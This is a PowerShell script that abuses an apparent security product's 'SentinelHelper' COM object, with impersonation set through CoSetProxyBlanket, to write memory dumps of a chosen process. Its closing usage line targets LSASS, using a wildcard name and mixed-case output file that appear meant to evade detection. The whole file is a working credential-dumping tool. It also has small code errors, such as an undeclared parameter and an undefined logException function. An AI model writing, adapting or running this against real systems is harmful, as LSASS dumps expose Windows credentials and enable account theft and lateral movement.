function Get-HelperComObject {
    $code = @"
         using System;
         using System.Runtime.InteropServices;

         public class ImpTest
         {
             [DllImport("Ole32.dll", CharSet = CharSet.Auto)]
             public static extern int CoSetProxyBlanket(
                IntPtr pProxy,
                uint dwAuthnSvc,
                uint dwAuthzSvc,
                uint pServerPrincName,
                uint dwAuthLevel,
                uint dwImpLevel,
                IntPtr pAuthInfo,
                uint dwCapabilities
             );

             public static int SetSecurity(object objDCOM)
             {
                 IntPtr dispatchInterface = Marshal.GetIDispatchForObject(objDCOM);
                 int hr = CoSetProxyBlanket(
                    dispatchInterface,
                    0xffffffff,
                    0xffffffff,
                    0xffffffff,
                    0, // Authentication Level
                    3, // Impersonation Level
                    IntPtr.Zero,
                    64
                 );
                 return hr;
             }
         }
"@
    try {
        Add-Type -TypeDefinition $code | Out-Null

        log "Initializing SentinelHelper COM object..." | Out-Null
        $SentinelHelper = New-Object -com "SentinelHelper.1"

        log "SentinelHelper COM object initialized successfully" | Out-Null
        [ImpTest]::SetSecurity($SentinelHelper)  | Out-Null
        $SentinelHelper

    } catch {
        logException -Msg "Error getting helper com object" -Ex $_ | Out-Null
    }
}

function DumpProcessPid {
    param(
        [int] $targetPID,
        [string] $outputFile
    )

    log "Trying to dump process ID $targetPID to '$outputFile' ..."
    try {
        $SentinelHelper = Get-HelperComObject

        function TakeDump {
            param(
                [int] $ProcessId,
                [string] $User,
                [string] $Kernel
            )

            $SentinelHelper.dump($ProcessId, $User, $Kernel)
        }

        log "Dumping Process ID: $targetPID"

        $userDump = $outputFile + "__User.txt"
        $kernelDump = $outputFile + "__Kernel.txt"

        TakeDump -SentinelHelper $SentinelHelper `
                 -ProcessId $targetPID `
                 -User $userDump `
                 -Kernel $kernelDump

    } catch {
        log -Msg "Error running helper commands" -Ex $_
    }
}


function log {
    param(
        [string] $Msg,
        [string] $Ex
    )

    Write-Host "[$(Get-Date)] $Msg $Ex"
    
}

Write-Host "Load: PS> . .\SentinelDump.ps1"
Write-Host "Run: PS> DumpProcessPid -targetPID (Get-Process lsa?s).id -outputFile C:\Windows\Temp\lSaSs"
